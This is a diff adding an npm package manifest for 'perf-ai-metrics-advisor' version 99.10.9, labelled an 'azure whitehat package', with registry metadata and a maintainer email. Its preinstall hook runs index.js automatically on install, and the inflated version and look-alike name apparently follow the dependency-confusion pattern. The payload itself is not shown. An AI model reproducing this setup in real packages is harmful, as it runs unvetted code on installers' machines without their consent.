@@ -1,0 +1,39 @@
+{
+    "name": "perf-ai-metrics-advisor",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-ai-metrics-advisor@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-8Q8h8w5P7W1VbeRiYO1U71+4oLb1TkdBo/DxyyzdA0dfHZBTV/JpDssIXK8zoVL92IQiQfzfSvQVUgpKgXfCsw==",
+        "shasum": "0620e24f850896e45f3458944161ec0088163180",
+        "tarball": "https://registry.npmjs.org/perf-ai-metrics-advisor/-/perf-ai-metrics-advisor-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3587,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon5rCRA9TVsSAnZWagAAjjYP/3DA03C3S29sX+5i2jh8\nPz2KLfFfbqO5UJIKlcS46KfhsQSdx/W3ASWCieLxM/Pf0q3TIrRJX6utwbOI\nZRD2HwC9C9yBSA/Vg08zqF75epsK12+Ia++z53pCd5CivzOcR/34fuc7t1A+\nUhXrmecEQg76T+AlGEUK+MSN+3WxxgoI0KAtKOtuiibrJmVAktwZCDnn6rtp\ni4Fl92/ALz4hDOQnLliJtFRuVEOmQluRD/z2O9zHCXD2DtcMGBhV/ibLwghU\nBzPi1+k57fDY+7S+gC/mV2fPh2LeVL21iSs5tkC2CYrV+rqMO2/1c9Y/mC5n\nsY+vaVCqtIWKpUht+5/SD7Hp7W3gCeEXqA03xL4LUwC3VmEsL6w+0JlerM8f\npQy0cLPHK+QO+/QkinWAdIl78ICjexYk7rJh0++G4VNuz+6609srzovQTWe8\nb1982nPknRuSlPvXdwbOI+x3Cuijtq/HDAs3WMk2tOJOF0zve3wzLKUPycmj\ntW1zbkfaAI/etDCCHqyHuUudYwdjLUSmXsS70ucpk6k7lhPkoUxNaXtw4rCM\nYj1DoKeR6ZIoRgEoFoHYoOVN213C4XybhSlQzZfRrRhp3DyiVWBJlgh+frU4\nsSxu1i7Gj4DC02ieGX3md9aXwzxX5hI99bHAoidnQR9+FQnBXauMqxW0UjW8\ndKGf\r\n=9jLF\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-ai-metrics-advisor_99.10.9_1638039147162_0.30938337995722764"
+    },
+    "_hasShrinkwrap": false
+}
